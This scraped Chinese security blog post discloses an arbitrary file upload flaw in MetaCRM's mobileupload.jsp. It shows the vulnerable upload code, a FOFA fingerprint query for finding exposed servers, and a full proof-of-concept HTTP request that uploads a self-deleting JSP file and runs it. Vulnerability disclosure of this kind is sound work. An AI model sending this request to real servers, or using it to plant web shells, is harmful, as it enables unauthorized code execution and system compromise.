---
title: "美特CRM mobileupload.jsp 任意文件上传漏洞"
source: https://mrxn.net/jswz/metasoft-mobileupload-fileupload-rce.html
asset_dir: assets/美特crm-mobileupload.jsp-任意文件上传漏洞
---

# 美特CRM mobileupload.jsp 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/20 12:37
- 1051浏览
- [0评论](#comment)
- 19分钟阅读

深入探索

服务器

脚本

scripts

---

# 漏洞简介

MetaCRM是一款智能平台化CRM[软件](#),通过提升企业管理和协同办公,全面提高企业管理水平和运营效率,帮助企业实现卓越管理。美特CRM mobileupload.jsp 接口存在任意[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)，攻击者无需经过严格身份验证即可向服务器上传任意类型的文件，包括可执行的恶意[脚本](#)。一旦利用此漏洞，攻击者可能在服务器上部署后门、[WebShell](https://mrxn.net/tag/rce) 等恶意程序，从而实现远程代码执行、服务器控制，甚至进一步窃取敏感数据或破坏业务系统的正常运行。

客户关系管理

# 影响版本

# fofa语法

> body="/common/[scripts](#)/basic.js" && body="www.metacrm.com.cn"

# 漏洞分析

直接看mobileupload.jsp实现逻辑当中关键部分

```
upload.setHeaderEncoding("utf-8");
upload.setProgressListener(getBarListener);
List uploadlist=upload.parseRequest(request);
Iterator iter=uploadlist.iterator();

while (iter.hasNext()) {
  FileItem item=(FileItem)iter.next();
  filename=org.apache.commons.io.FilenameUtils.getName(item.getName());

  if (!item.isFormField() && !sizeflag && !formatflag) {
      int iSept=filename.lastIndexOf(java.io.File.separator);
      if (iSept>0)
          filename=filename.substring(0,iSept);
      if (!filename.equals("")) {
          iSaveSize +=item.getSize();
      iSaveCount +=1;
      //System.out.println("start "+filename);
      affixID = com.metasoft.framework.pub.util.Oid.getOid();
      if (filename.indexOf(".")!=-1) {
          affixID +=filename.substring(filename.lastIndexOf("."));
      }
      java.io.File saveFilepath=new java.io.File(path+affixID);
                //是否有附件存储规则定义
                if(flag){
                    affixID = childPath+"/"+affixID;
                }
      item.write(saveFilepath);
    }
```

深入探索

SQL注入防护

技术文章订阅

云安全解决方案

最主要是上传文件后缀截取至用户上传设置的filename的最后一个点后的后缀，这个由用户控制，因此造成任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞。

# 漏洞复现

```
POST /mobile/mobileupload.jsp HTTP/1.1
Host: metasoft.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary123456

------WebKitFormBoundary123456
Content-Disposition: form-data; name="file"; filename="1.jsp"

<%out.println(java.util.UUID.randomUUID().toString());new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundary123456--
```

深入探索

编程语言教程

安全研究工具

文件大小转换

在响应里回显了文件路径以及文件名

漏洞扫描服务

[![美特CRM mobileupload.jsp 任意文件上传漏洞](images/img-001-e5e4efc2a60a.webp)](https://image.mrxn.net/5e825030efef44ce9e68b186e1e376f8.webp)

访问上传文件，成功[执行代码](https://mrxn.net/tag/rce)，打印随机UUID并删除自身

[![美特CRM mobileupload.jsp 任意文件上传漏洞](images/img-002-989487703de4.webp)](https://image.mrxn.net/7e8acb5d3020413bb1fff7dcd3a57437.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
